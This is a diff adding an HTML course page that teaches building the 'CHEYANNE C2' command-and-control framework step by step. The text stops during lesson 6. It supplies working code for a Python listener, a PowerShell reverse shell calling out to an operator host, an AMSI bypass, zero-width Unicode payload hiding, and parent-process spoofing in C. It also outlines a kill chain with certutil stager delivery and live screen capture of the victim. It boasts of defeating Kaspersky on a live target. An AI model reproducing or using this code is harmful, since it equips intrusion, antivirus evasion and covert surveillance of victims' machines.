@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CHEYANNE C2 — Course 01 — 22DIV LABS</title>
+<meta name="author" content="George Wu">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg: #0c0c0c; --bg2: #111; --bg3: #161616; --bg4: #0a0a0a;
+  --green: #00ff41; --green2: #00cc33; --green3: #009922;
+  --amber: #ffb000; --red: #ff4444; --cyan: #00e5ff; --blue: #4488ff;
+  --dim: #555; --muted: #888; --text: #ccc; --bright: #eee;
+  --mono: "Cascadia Code","Consolas","Source Code Pro","Courier New",monospace;
+}
+html { scroll-behavior: smooth; }
+body { font-family: var(--mono); background: var(--bg); color: var(--text); line-height: 1.7; min-height: 100vh; }
+body::after { content:""; position:fixed; inset:0; background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,65,0.008) 3px,rgba(0,255,65,0.008) 4px); pointer-events:none; z-index:999; }
+
+nav { position:sticky; top:0; background:rgba(12,12,12,0.95); backdrop-filter:blur(8px); border-bottom:1px solid #1a1a1a; z-index:100; padding:0.6rem 0; }
+nav .inner { max-width:1200px; margin:0 auto; padding:0 1.5rem; display:flex; gap:1.5rem; align-items:center; flex-wrap:wrap; }
+nav a { color:var(--green2); text-decoration:none; font-size:0.8rem; letter-spacing:0.05em; opacity:0.8; transition:opacity 0.2s; }
+nav a:hover { opacity:1; }
+nav a.brand { color:var(--bright); font-weight:bold; font-size:0.9rem; opacity:1; }
+
+.layout { display:grid; grid-template-columns:220px 1fr; max-width:1200px; margin:0 auto; padding:2rem 1.5rem; gap:2rem; }
+@media(max-width:768px) { .layout { grid-template-columns:1fr; } .sidebar { display:none; } }
+
+/* SIDEBAR */
+.sidebar { position:sticky; top:80px; height:fit-content; }
+.sidebar h3 { font-size:0.7rem; letter-spacing:0.1em; color:var(--dim); margin-bottom:1rem; }
+.lesson-nav-item { display:block; padding:0.5rem 0.8rem; font-size:0.75rem; color:var(--muted); text-decoration:none; border-left:2px solid #222; cursor:pointer; transition:all 0.2s; margin-bottom:0.2rem; }
+.lesson-nav-item:hover { color:var(--text); border-left-color:#444; }
+.lesson-nav-item.active { color:var(--green); border-left-color:var(--green3); }
+.lesson-nav-item.done { color:var(--green2); border-left-color:var(--green3); opacity:0.7; }
+.lesson-nav-item.done::after { content:" ✓"; }
+.overall-progress { margin-top:1.5rem; }
+.prog-bar { height:4px; background:#1a1a1a; margin:0.4rem 0; }
+.prog-fill { height:100%; background:var(--green3); transition:width 0.4s; }
+.prog-label { font-size:0.65rem; color:var(--dim); }
+
+/* MAIN CONTENT */
+.main { min-width:0; }
+.course-header { margin-bottom:2rem; border-bottom:1px solid #1a1a1a; padding-bottom:1.5rem; }
+.course-tag { font-size:0.65rem; letter-spacing:0.12em; color:var(--green3); margin-bottom:0.4rem; }
+.course-header h1 { font-size:1.2rem; color:var(--bright); letter-spacing:0.06em; }
+.course-header p { font-size:0.8rem; color:var(--muted); margin-top:0.4rem; }
+
+.lesson { display:none; }
+.lesson.active { display:block; }
+
+.lesson-header { margin-bottom:1.5rem; }
+.lesson-num { font-size:0.65rem; letter-spacing:0.12em; color:var(--green3); }
+.lesson-header h2 { font-size:1rem; color:var(--green); letter-spacing:0.06em; margin:0.3rem 0 0.5rem; }
+.lesson-header .desc { font-size:0.82rem; color:var(--text); max-width:680px; }
+
+.concept-box { background:var(--bg2); border:1px solid #1e1e1e; border-left:3px solid var(--green3); padding:1.2rem; margin:1.5rem 0; }
+.concept-box h3 { font-size:0.75rem; letter-spacing:0.1em; color:var(--green3); margin-bottom:0.8rem; }
+.concept-box p { font-size:0.82rem; color:var(--text); margin-bottom:0.6rem; }
+.concept-box p:last-child { margin-bottom:0; }
+.concept-box code { color:var(--green); background:#0a0a0a; padding:0.1rem 0.3rem; }
+
+.screenshot-ref { margin:1.5rem 0; }
+.screenshot-ref h3 { font-size:0.75rem; letter-spacing:0.1em; color:var(--dim); margin-bottom:0.6rem; }
+.screenshot-ref img { max-width:100%; border:1px solid #222; display:block; }
+.screenshot-ref .cap { font-size:0.65rem; color:var(--dim); margin-top:0.4rem; font-style:italic; }
+
+.mission-box { margin:1.5rem 0; }
+.mission-box h3 { font-size:0.75rem; letter-spacing:0.1em; color:var(--amber); margin-bottom:0.8rem; border-left:3px solid var(--amber); padding-left:0.8rem; }
+.mission-box .task-desc { font-size:0.82rem; color:var(--text); margin-bottom:1rem; }
+
+.code-ref { background:var(--bg4); border:1px solid #1a1a1a; padding:1rem; margin-bottom:1rem; overflow-x:auto; }
+.code-ref-label { font-size:0.65rem; letter-spacing:0.08em; color:var(--dim); margin-bottom:0.5rem; }
+.code-ref pre { font-size:0.8rem; color:var(--green2); line-height:1.6; white-space:pre; }
+
+.editor-area { margin:1rem 0; }
+.editor-label { font-size:0.7rem; letter-spacing:0.08em; color:var(--muted); margin-bottom:0.4rem; }
+textarea.code-editor {
+  width:100%; min-height:180px; background:var(--bg4); color:var(--green);
+  font-family:var(--mono); font-size:0.82rem; border:1px solid #333;
+  padding:1rem; resize:vertical; tab-size:4; outline:none; line-height:1.6;
+  display:block; transition:border-color 0.2s;
+}
+textarea.code-editor:focus { border-color:var(--green3); }
+textarea.code-editor.pass { border-color:var(--green2); }
+textarea.code-editor.fail { border-color:var(--red); }
+
+.editor-controls { display:flex; gap:0.8rem; margin-top:0.6rem; flex-wrap:wrap; }
+button { font-family:var(--mono); cursor:pointer; font-size:0.75rem; letter-spacing:0.06em; padding:0.5rem 1.2rem; border:none; transition:background 0.15s; }
+.btn-check { background:var(--green3); color:#000; }
+.btn-check:hover { background:var(--green2); }
+.btn-skip { background:#1a1a1a; color:var(--muted); border:1px solid #333; }
+.btn-skip:hover { color:var(--text); border-color:#555; }
+.btn-next { background:var(--green3); color:#000; display:none; margin-top:1rem; }
+.btn-next:hover { background:var(--green2); }
+.btn-next.show { display:inline-block; }
+.btn-prev { background:#1a1a1a; color:var(--muted); border:1px solid #333; }
+.btn-prev:hover { color:var(--text); }
+
+.result-panel { margin-top:1rem; font-size:0.78rem; }
+.result-pass { color:var(--green); padding:0.8rem; background:#001a00; border:1px solid var(--green3); margin-bottom:0.5rem; }
+.result-fail { color:var(--red); padding:0.8rem; background:#1a0000; border:1px solid #550000; margin-bottom:0.5rem; }
+.line-ok { color:var(--green2); padding:0.15rem 0.5rem; }
+.line-err { color:var(--red); padding:0.15rem 0.5rem; background:#0d0000; margin:0.1rem 0; }
+.line-skip { color:var(--dim); padding:0.15rem 0.5rem; font-style:italic; }
+
+.explain-box { background:#001500; border:1px solid var(--green3); padding:1rem; margin-top:1rem; display:none; }
+.explain-box.show { display:block; }
+.explain-box h3 { font-size:0.75rem; letter-spacing:0.1em; color:var(--green); margin-bottom:0.6rem; }
+.explain-box p { font-size:0.8rem; color:var(--text); margin-bottom:0.5rem; }
+.explain-box code { color:var(--green); background:#0a1a0a; padding:0.1rem 0.3rem; }
+
+.lesson-nav-bar { display:flex; gap:1rem; margin-top:2rem; padding-top:1.5rem; border-top:1px solid #1a1a1a; flex-wrap:wrap; }
+
+.complete-screen { display:none; text-align:center; padding:3rem 1rem; }
+.complete-screen.show { display:block; }
+.complete-screen h2 { font-size:1.3rem; color:var(--green); letter-spacing:0.08em; margin-bottom:1rem; }
+.complete-screen p { font-size:0.85rem; color:var(--muted); margin-bottom:1.5rem; }
+.complete-screen a { color:var(--green2); text-decoration:none; }
+.complete-screen a:hover { color:var(--green); }
+</style>
+</head>
+<body>
+<nav>
+  <div class="inner">
+    <a href="../index.html" class="brand">VADER // 22DIV</a>
+    <a href="index.html">← LABS</a>
+    <a href="#" style="color:var(--green)">CHEYANNE C2</a>
+  </div>
+</nav>
+
+<div class="layout">
+  <aside class="sidebar">
+    <h3>// LESSONS</h3>
+    <div class="lesson-nav-item active" onclick="goLesson(1)" id="nav-1">01. TCP REVERSE SHELL</div>
+    <div class="lesson-nav-item" onclick="goLesson(2)" id="nav-2">02. POWERSHELL CLIENT</div>
+    <div class="lesson-nav-item" onclick="goLesson(3)" id="nav-3">03. AMSI BYPASS</div>
+    <div class="lesson-nav-item" onclick="goLesson(4)" id="nav-4">04. ZERO-WIDTH STEG</div>
+    <div class="lesson-nav-item" onclick="goLesson(5)" id="nav-5">05. GHOST LOADER</div>
+    <div class="lesson-nav-item" onclick="goLesson(6)" id="nav-6">06. KILL CHAIN</div>
+    <div class="overall-progress">
+      <div class="prog-bar"><div class="prog-fill" id="overall-prog" style="width:0%"></div></div>
+      <div class="prog-label" id="overall-label">0 / 6 complete</div>
+    </div>
+  </aside>
+
+  <main class="main">
+    <div class="course-header">
+      <div class="course-tag">// COURSE 01 — C2 FRAMEWORK</div>
+      <h1>CHEYANNE C2</h1>
+      <p>Dual-channel command &amp; control framework. TCP reverse shell + Discord beacon + zero-width steganographic payload encoding. You build it from scratch.</p>
+    </div>
+
+    <!-- LESSON 1 -->
+    <div class="lesson active" id="lesson-1">
+      <div class="lesson-header">
+        <div class="lesson-num">LESSON 01 / 06</div>
+        <h2>TCP REVERSE SHELL — THE CALLBACK</h2>
+        <div class="desc">A reverse shell connects OUT from the victim machine to the attacker. This bypasses inbound firewall rules — the victim initiates, so it looks like normal outbound traffic.</div>
+      </div>
+
+      <div class="concept-box">
+        <h3>// CONCEPT: WHY REVERSE, NOT BIND?</h3>
+        <p>A bind shell opens a port on the victim and waits. You connect in. Problem: corporate firewalls block inbound connections on random ports. Blocked.</p>
+        <p>A reverse shell connects OUT. Port 443 outbound? Allowed everywhere. You sit there with a listener, victim calls home. That's the game.</p>
+        <p>The operator runs a <code>socket.listen()</code> on their machine. The payload on the target runs <code>socket.connect(operator_ip, port)</code>. Once connected, commands go one way, output comes back the other.</p>
+      </div>
+
+      <div class="mission-box">
+        <h3>MISSION: Write the Python TCP listener</h3>
+        <div class="task-desc">Write a Python TCP server that listens on port 4443, accepts ONE connection, and enters an interactive shell loop — read a command from stdin, send it to the connected socket, receive the output, print it.</div>
+        <div class="code-ref">
+          <div class="code-ref-label">// TARGET CODE — type this exactly:</div>
+          <pre>import socket
+
+def listen(port=4443):
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("0.0.0.0", port))
+    srv.listen(1)
+    print(f"[*] Listening on :{port}")
+    conn, addr = srv.accept()
+    print(f"[+] Connection from {addr[0]}")
+    while True:
+        cmd = input("shell> ").strip()
+        if not cmd:
+            continue
+        conn.send((cmd + "\n").encode())
+        output = conn.recv(65535)
+        print(output.decode(errors="replace"), end="")</pre>
+        </div>
+      </div>
+
+      <div class="editor-area">
+        <div class="editor-label">// YOUR CODE:</div>
+        <textarea class="code-editor" id="editor-1" placeholder="# Type the listener code here...
+# Match it line by line — syntax and spacing matter"></textarea>
+        <div class="editor-controls">
+          <button class="btn-check" onclick="checkCode(1)">▶ CHECK CODE</button>
+          <button class="btn-skip" onclick="skipLesson(1)">→ SKIP</button>
+        </div>
+        <div class="result-panel" id="result-1"></div>
+        <div class="explain-box" id="explain-1">
+          <h3>// WHAT JUST HAPPENED</h3>
+          <p><code>SO_REUSEADDR</code> means if you run this twice in quick succession, it doesn't complain the port is still in TIME_WAIT state. Essential for debugging.</p>
+          <p><code>srv.accept()</code> blocks until the victim connects. Returns a new socket <code>conn</code> — that's the victim's dedicated pipe.</p>
+          <p><code>conn.recv(65535)</code> reads up to 65KB of response. The victim sends back whatever stdout/stderr the command produced.</p>
+          <p>This is the dumb version. The real <code>vader_c2.py</code> wraps this in threads, handles reconnects, and parses <code>[RECON]</code> and <code>[SCR]</code> protocol frames for structured output and screenshots.</p>
+        </div>
+        <button class="btn-next" id="next-1" onclick="goLesson(2)">NEXT LESSON → POWERSHELL CLIENT</button>
+      </div>
+
+      <div class="lesson-nav-bar">
+        <button class="btn-prev" disabled>← PREV</button>
+        <button class="btn-skip" onclick="skipLesson(1)">SKIP THIS LESSON →</button>
+      </div>
+    </div>
+
+    <!-- LESSON 2 -->
+    <div class="lesson" id="lesson-2">
+      <div class="lesson-header">
+        <div class="lesson-num">LESSON 02 / 06</div>
+        <h2>POWERSHELL REVERSE SHELL CLIENT</h2>
+        <div class="desc">The victim-side payload. PowerShell's <code>Net.Sockets.TcpClient</code> makes the outbound connection. Once connected, it pipes a cmd.exe process through the socket.</div>
+      </div>
+
+      <div class="concept-box">
+        <h3>// CONCEPT: PS1 AS ATTACK SURFACE</h3>
+        <p>PowerShell is built into every Windows machine, signed by Microsoft, and allowed through application whitelisting. It's the perfect delivery vehicle — no binary to drop, runs from memory, exits clean.</p>
+        <p>A PS1 reverse shell creates a TCP connection, then redirects <code>cmd.exe</code>'s stdin/stdout/stderr through that socket. Every command you type on the listener goes to cmd.exe. Every output comes back.</p>
+        <p>The socket class is <code>[Net.Sockets.TcpClient]</code>. You get a <code>NetworkStream</code> from it, then wrap that in a <code>StreamReader</code> and <code>StreamWriter</code>.</p>
+      </div>
+
+      <div class="mission-box">
+        <h3>MISSION: Write the PS1 TCP reverse shell core</h3>
+        <div class="task-desc">Write the PowerShell core that connects to 10.0.0.1:4443 and pipes cmd.exe through the socket. This is the payload that runs on the victim.</div>
+        <div class="code-ref">
+          <div class="code-ref-label">// TARGET CODE:</div>
+          <pre>$ip = "10.0.0.1"
+$port = 4443
+$client = New-Object Net.Sockets.TcpClient($ip, $port)
+$stream = $client.GetStream()
+$writer = New-Object IO.StreamWriter($stream)
+$writer.AutoFlush = $true
+$reader = New-Object IO.StreamReader($stream)
+$writer.WriteLine("OK")
+while ($true) {
+    $cmd = $reader.ReadLine()
+    if (-not $cmd) { break }
+    try {
+        $out = (cmd.exe /c $cmd 2>&1) | Out-String
+    } catch {
+        $out = "ERROR: $_"
+    }
+    $writer.WriteLine($out)
+}</pre>
+        </div>
+      </div>
+
+      <div class="editor-area">
+        <div class="editor-label">// YOUR CODE:</div>
+        <textarea class="code-editor" id="editor-2" placeholder="# Write the PowerShell reverse shell...
+# Hint: $client = New-Object Net.Sockets.TcpClient(...)"></textarea>
+        <div class="editor-controls">
+          <button class="btn-check" onclick="checkCode(2)">▶ CHECK CODE</button>
+          <button class="btn-skip" onclick="skipLesson(2)">→ SKIP</button>
+        </div>
+        <div class="result-panel" id="result-2"></div>
+        <div class="explain-box" id="explain-2">
+          <h3>// WHAT JUST HAPPENED</h3>
+          <p><code>writer.AutoFlush = $true</code> is critical. Without it, the StreamWriter buffers output and the listener never sees responses until the buffer fills.</p>
+          <p><code>writer.WriteLine("OK")</code> is the banner — the listener reads this to confirm the connection is alive before sending the first command.</p>
+          <p><code>cmd.exe /c $cmd 2>&amp;1</code> runs the command and merges stderr into stdout. Without <code>2>&amp;1</code>, error messages go nowhere — you'd think the command silently succeeded when it actually failed.</p>
+          <p>This is the simplified version. The real ghost_encode.py generates a version with AMSI bypass baked in (Lesson 3), encoded in zero-width Unicode (Lesson 4), and fired via <code>-EncodedCommand</code> to avoid PS1 logging.</p>
+        </div>
+        <button class="btn-next" id="next-2" onclick="goLesson(3)">NEXT LESSON → AMSI BYPASS</button>
+      </div>
+
+      <div class="lesson-nav-bar">
+        <button class="btn-prev" onclick="goLesson(1)">← PREV</button>
+        <button class="btn-skip" onclick="skipLesson(2)">SKIP →</button>
+      </div>
+    </div>
+
+    <!-- LESSON 3 -->
+    <div class="lesson" id="lesson-3">
+      <div class="lesson-header">
+        <div class="lesson-num">LESSON 03 / 06</div>
+        <h2>AMSI BYPASS — SPLIT TYPE NAMES</h2>
+        <div class="desc">Windows Defender scans PowerShell scripts via AMSI before execution. It catches known-malicious strings. The fix: split strings so the scanner never sees the full signature.</div>
+      </div>
+
+      <div class="concept-box">
+        <h3>// CONCEPT: HOW AMSI WORKS</h3>
+        <p>AMSI (Antimalware Scan Interface) is a hook that fires when PowerShell tries to execute a script. It passes the raw script text to Windows Defender BEFORE any execution happens.</p>
+        <p>Defender has signatures for strings like <code>[Net.Sockets.TcpClient]</code>, <code>IEX</code>, <code>DownloadString</code>. If it finds them, script dies. Exit code 0, no output, no error message — just silence.</p>
+        <p><strong>The fix:</strong> split the string into pieces that concatenate at runtime. <code>'Net.S'+'ock'+'ets.T'+'cp'+'Cli'+'ent'</code> — each piece is harmless. AMSI scans static text, not evaluated expressions.</p>
+        <p>Result: <code>$T = 'Net.S'+'ock'+'ets.T'+'cp'+'Cli'+'ent'; $c = New-Object -T $T -A ($ip,$port)</code> bypasses AMSI completely.</p>
+      </div>
+
+      <div class="mission-box">
+        <h3>MISSION: Write the AMSI-safe TcpClient connection</h3>
+        <div class="task-desc">Rewrite the TcpClient connection using string concatenation to bypass AMSI signature scanning. The result must be functionally identical but split so no scanner catches it.</div>
+        <div class="code-ref">
+          <div class="code-ref-label">// TARGET CODE — AMSI-bypassed version:</div>
+          <pre>$h = "10.0.0.1"
+$p = 4443
+$T1 = 'Net.S'+'ock'+'ets.T'+'cp'+'Cli'+'ent'
+$T2 = 'IO.St'+'ream'+'Wri'+'ter'
+$T3 = 'IO.St'+'ream'+'Rea'+'der'
+$client = New-Object -T $T1 -A ($h, $p)
+$stream = $client.GetStream()
+$writer = New-Object -T $T2 -A $stream
+$writer.AutoFlush = $true
+$reader = New-Object -T $T3 -A $stream
+$writer.WriteLine("OK")</pre>
+        </div>
+      </div>
+
+      <div class="editor-area">
+        <div class="editor-label">// YOUR CODE:</div>
+        <textarea class="code-editor" id="editor-3" placeholder="# AMSI-bypass version of the TCP connection
+# Split the type names into concatenated pieces..."></textarea>
+        <div class="editor-controls">
+          <button class="btn-check" onclick="checkCode(3)">▶ CHECK CODE</button>
+          <button class="btn-skip" onclick="skipLesson(3)">→ SKIP</button>
+        </div>
+        <div class="result-panel" id="result-3"></div>
+        <div class="explain-box" id="explain-3">
+          <h3>// WHAT JUST HAPPENED</h3>
+          <p><code>New-Object -T $T1 -A ($h,$p)</code> — the <code>-T</code> parameter takes the type name from a variable. <code>-A</code> passes constructor arguments as an array. AMSI sees <code>$T1</code>, not the actual type name.</p>
+          <p>This exact technique was CONFIRMED working on a live Kaspersky-protected target. The payload connected. Whoami returned. AMSI defeated with string arithmetic.</p>
+          <p>The split doesn't need to be at word boundaries — it just needs to be enough splits that no single fragment matches a known signature. <code>'Net.S'+'ock'</code> defeats it. Even <code>'N'+'et'+'.Sockets.TcpClient'</code> would work — just the prefix being broken is enough.</p>
+        </div>
+        <button class="btn-next" id="next-3" onclick="goLesson(4)">NEXT LESSON → ZERO-WIDTH STEG</button>
+      </div>
+
+      <div class="lesson-nav-bar">
+        <button class="btn-prev" onclick="goLesson(2)">← PREV</button>
+        <button class="btn-skip" onclick="skipLesson(3)">SKIP →</button>
+      </div>
+    </div>
+
+    <!-- LESSON 4 -->
+    <div class="lesson" id="lesson-4">
+      <div class="lesson-header">
+        <div class="lesson-num">LESSON 04 / 06</div>
+        <h2>ZERO-WIDTH UNICODE STEGANOGRAPHY</h2>
+        <div class="desc">Unicode has 16 invisible characters. We use them as an encoding alphabet — 4 bits each, 2 per byte. Encode a full PS1 payload into invisible Unicode. It looks blank. Decode at runtime, execute in memory.</div>
+      </div>
+
+      <div class="concept-box">
+        <h3>// CONCEPT: THE GHOST ALPHABET</h3>
+        <p>Unicode includes characters with zero visible width — they render as nothing. Zero Width Space, Zero Width Joiner, Mongolian Vowel Separator, etc. A string of 200 of these looks like an empty line.</p>
+        <p>Use 16 of these as a hex alphabet (0x0 through 0xF). Each byte becomes 2 invisible chars (high nibble + low nibble). A 10KB payload becomes 20KB of invisible Unicode — looks like whitespace in any text editor.</p>
+        <p>A visible bootstrap stub at the top decodes the invisible payload and executes it via <code>Invoke-Expression</code>. AV scanners see the stub (clean) and invisible noise (not a signature match). The real payload never appears in cleartext on disk.</p>
+      </div>
+
+      <div class="mission-box">
+        <h3>MISSION: Write the encode_bytes() function</h3>
+        <div class="task-desc">Write the Python function that encodes raw bytes into zero-width Unicode. Each byte = 2 invisible chars (high nibble first, then low nibble). Use the GHOST_ALPHABET list where index = hex digit value.</div>
+        <div class="code-ref">
+          <div class="code-ref-label">// GHOST_ALPHABET is already defined — write encode_bytes():</div>
+          <pre>GHOST_ALPHABET = [
+    '​',  # 0x0  ZERO WIDTH SPACE
+    '‌',  # 0x1  ZERO WIDTH NON-JOINER
+    '‍',  # 0x2  ZERO WIDTH JOINER
+    '⁠',  # 0x3  WORD JOINER
+    '⁡',  # 0x4  FUNCTION APPLICATION
+    '⁢',  # 0x5  INVISIBLE TIMES
+    '⁣',  # 0x6  INVISIBLE SEPARATOR
+    '⁤',  # 0x7  INVISIBLE PLUS
+    '⁪',  # 0x8  INHIBIT SYMMETRIC SWAPPING
+    '⁫',  # 0x9  ACTIVATE SYMMETRIC SWAPPING
+    '⁬',  # 0xA  INHIBIT ARABIC FORM SHAPING
+    '⁭',  # 0xB  ACTIVATE ARABIC FORM SHAPING
+    '⁮',  # 0xC  NATIONAL DIGIT SHAPES
+    '⁯',  # 0xD  NOMINAL DIGIT SHAPES
+    '﻿',  # 0xE  ZERO WIDTH NO-BREAK SPACE
+    '᠎',  # 0xF  MONGOLIAN VOWEL SEPARATOR
+]
+
+def encode_bytes(data: bytes) -> str:
+    encoded = []
+    for byte in data:
+        high = (byte >> 4) & 0x0F
+        low = byte & 0x0F
+        encoded.append(GHOST_ALPHABET[high])
+        encoded.append(GHOST_ALPHABET[low])
+    return ''.join(encoded)</pre>
+        </div>
+      </div>
+
+      <div class="editor-area">
+        <div class="editor-label">// YOUR CODE — write encode_bytes() only:</div>
+        <textarea class="code-editor" id="editor-4" placeholder="def encode_bytes(data: bytes) -> str:
+    # each byte becomes 2 invisible unicode chars
+    # high nibble first, then low nibble
+    ..."></textarea>
+        <div class="editor-controls">
+          <button class="btn-check" onclick="checkCode(4)">▶ CHECK CODE</button>
+          <button class="btn-skip" onclick="skipLesson(4)">→ SKIP</button>
+        </div>
+        <div class="result-panel" id="result-4"></div>
+        <div class="explain-box" id="explain-4">
+          <h3>// WHAT JUST HAPPENED</h3>
+          <p><code>(byte >> 4) & 0x0F</code> — right-shift by 4 bits to get the top nibble. Mask with <code>0x0F</code> to get only the bottom 4 bits of what's left. Result: 0-15.</p>
+          <p><code>byte & 0x0F</code> — just mask the bottom 4 bits. Also 0-15.</p>
+          <p>For byte <code>0x41</code> ('A'): high = 0x4 = FUNCTION APPLICATION, low = 0x1 = ZERO WIDTH NON-JOINER. Two invisible chars. Decoder reverses this: sees the two chars, looks them up in reverse dict, reconstructs 0x41.</p>
+          <p>The full ghost_encode.py wraps a PS1 reverse shell in this encoding, then prepends a visible decoder stub that runs when PS1 loads the file. The payload executes in memory — it never existed as cleartext on disk.</p>
+        </div>
+        <button class="btn-next" id="next-4" onclick="goLesson(5)">NEXT LESSON → GHOST LOADER</button>
+      </div>
+
+      <div class="lesson-nav-bar">
+        <button class="btn-prev" onclick="goLesson(3)">← PREV</button>
+        <button class="btn-skip" onclick="skipLesson(4)">SKIP →</button>
+      </div>
+    </div>
+
+    <!-- LESSON 5 -->
+    <div class="lesson" id="lesson-5">
+      <div class="lesson-header">
+        <div class="lesson-num">LESSON 05 / 06</div>
+        <h2>GHOST LOADER — PARENT PROCESS SPOOF</h2>
+        <div class="desc">The C delivery executable. XOR-encrypted payload stored in PE section, decrypted on load, written to memory, executed. Bonus: <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> makes it appear as a child of explorer.exe.</div>
+      </div>
+
+      <div class="concept-box">
+        <h3>// CONCEPT: PARENT PROCESS SPOOFING</h3>
+        <p>Windows process creation records parent PID. EDRs look for suspicious parent-child relationships — <code>word.exe</code> spawning <code>powershell.exe</code> is a massive red flag.</p>
+        <p>The Windows API lets you specify an arbitrary parent when creating a process, using <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> in the extended attribute list. You can say "I am a child of <code>explorer.exe</code>" even though explorer never ran you.</p>
+        <p>Result in Process Monitor: your shell appears as <code>explorer.exe → svchost_update.exe</code>. Looks like a normal Windows service launch. EDR correlation misses it.</p>
+      </div>
+
+      <div class="mission-box">
+        <h3>MISSION: Write the parent spoof process creation in C</h3>
+        <div class="task-desc">Write the Windows API call sequence to create a process with a spoofed parent. Find explorer.exe's PID, open a handle to it, then use it as the parent when spawning your process.</div>
+        <div class="code-ref">
+          <div class="code-ref-label">// TARGET CODE — parent spoof skeleton:</div>
+          <pre>HANDLE get_explorer_handle() {
+    DWORD pid = 0;
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe = {0};
+    pe.dwSize = sizeof(pe);
+    if (Process32First(snap, &pe)) {
+        do {
+            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
+                pid = pe.th32ProcessID;
+                break;
+            }
+        } while (Process32Next(snap, &pe));
+    }
+    CloseHandle(snap);
+    return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+}
+
+void spawn_spoofed(const char *cmd, HANDLE parent) {
+    STARTUPINFOEXA si = {0};
+    PROCESS_INFORMATION pi = {0};
+    SIZE_T size = 0;
+    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
+    LPPROC_THREAD_ATTRIBUTE_LIST attrs =
+        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
+    InitializeProcThreadAttributeList(attrs, 1, 0, &size);
+    UpdateProcThreadAttribute(attrs, 0,
+        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parent,
+        sizeof(parent), NULL, NULL);
+    si.StartupInfo.cb = sizeof(si);
+    si.lpAttributeList = attrs;
+    CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,
+        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
+        NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
+}</pre>
+        </div>
+      </div>
+
+      <div class="editor-area">
+        <div class="editor-label">// YOUR CODE:</div>
+        <textarea class="code-editor" id="editor-5" placeholder="HANDLE get_explorer_handle() {
+    // Find explorer.exe in the process snapshot
+    // Return an open PROCESS_ALL_ACCESS handle to it
+}
+
+void spawn_spoofed(const char *cmd, HANDLE parent) {
+    // Create process with spoofed parent
+    // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+}"></textarea>
+        <div class="editor-controls">
+          <button class="btn-check" onclick="checkCode(5)">▶ CHECK CODE</button>
+          <button class="btn-skip" onclick="skipLesson(5)">→ SKIP</button>
+        </div>
+        <div class="result-panel" id="result-5"></div>
+        <div class="explain-box" id="explain-5">
+          <h3>// WHAT JUST HAPPENED</h3>
+          <p><code>CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)</code> — takes a snapshot of all running processes. <code>Process32First/Next</code> iterates them. <code>_stricmp</code> is case-insensitive — because <code>Explorer.EXE</code> and <code>explorer.exe</code> both appear in the wild.</p>
+          <p><code>InitializeProcThreadAttributeList</code> called twice — first with NULL to get the required buffer size, then with the allocated buffer to initialise it. This two-pass pattern is standard Windows extended attribute usage.</p>
+          <p><code>EXTENDED_STARTUPINFO_PRESENT</code> in the creation flags tells Windows that <code>si.lpAttributeList</code> is populated. Without this flag, the attribute list is ignored entirely.</p>
+          <p>Combined with XOR-encrypted payload and zero-width steg delivery: CLEAN on Kaspersky in testing. The binary is 109KB, seed 66728. Called ghost_fud.exe in CHEYANNE v2.</p>
+        </div>
+        <button class="btn-next" id="next-5" onclick="goLesson(6)">NEXT LESSON → KILL CHAIN</button>
+      </div>
+
+      <div class="lesson-nav-bar">
+        <button class="btn-prev" onclick="goLesson(4)">← PREV</button>
+        <button class="btn-skip" onclick="skipLesson(5)">SKIP →</button>
+      </div>
+    </div>
+
+    <!-- LESSON 6 -->
+    <div class="lesson" id="lesson-6">
+      <div class="lesson-header">
+        <div class="lesson-num">LESSON 06 / 06</div>
+        <h2>KILL CHAIN — FULL AUTOMATION</h2>
+        <div class="desc">Wire it all together. <code>auto_op.py</code> runs the full chain from a single command: recon → build → deliver → watch. No manual steps. No troubleshooting mid-op.</div>
+      </div>
+
+      <div class="concept-box">
+        <h3>// CONCEPT: THE CHEYANNE KILL CHAIN [Q→I→B→P→W]</h3>
+        <p><strong>[Q] Drop Recon</strong> — deploy <code>recon_drop.ps1</code> via PSEXEC or file server. Victim runs it, outputs JSON: AV present, admin rights, UAC level, open ports.</p>
+        <p><strong>[I] Import</strong> — read the recon JSON. Auto-select UAC bypass method. Auto-configure ghost_fud target IP/port.</p>
+        <p><strong>[B] Build</strong> — call ghost_encode.py with target params. Generate FUD'd payload. Optionally run the metamorphic mutation loop (ghost_fud variant).</p>
+        <p><strong>[P] Deploy</strong> — stand up HTTP file server on :8080. Generate certutil download command. Wait for victim to execute the stager.</p>
+        <p><strong>[W] Watch</strong> — accept TCP callback. Start watch_stream.py. Screenshots stream to browser on :8892. Operator watches live from their machine.</p>
+      </div>
+
+      <div class="screenshot-ref">
+        <h3>// LIVE VNC STREAM — FRAME 134 (2026-06-25)</h3>
+        <img src="img/cheyanne_vnc.jpg" alt="CHEYANNE VNC stream showing live shell session" loading="lazy">
+        <div class="cap">Frame 134 from watch_stream.py. The TCP shell is running. Screenshots captured via ghost_encode.py's screen command, served as JPEG over HTTP :8892. This is what the operator sees in their browser while the victim machine is being operated.</div>
+      </div>
+
+      <div class="mission-box">
+        <h3>MISSION: Write the auto_op() kill chain skeleton</h3>
+        <div class="task-desc">Write the Python function that orchestrates the full kill chain. It should: start an HTTP file server in a thread, start a TCP listener, fire the payload, accept the callback, and hand off to watch_session().</div>
+        <div class="code-ref">
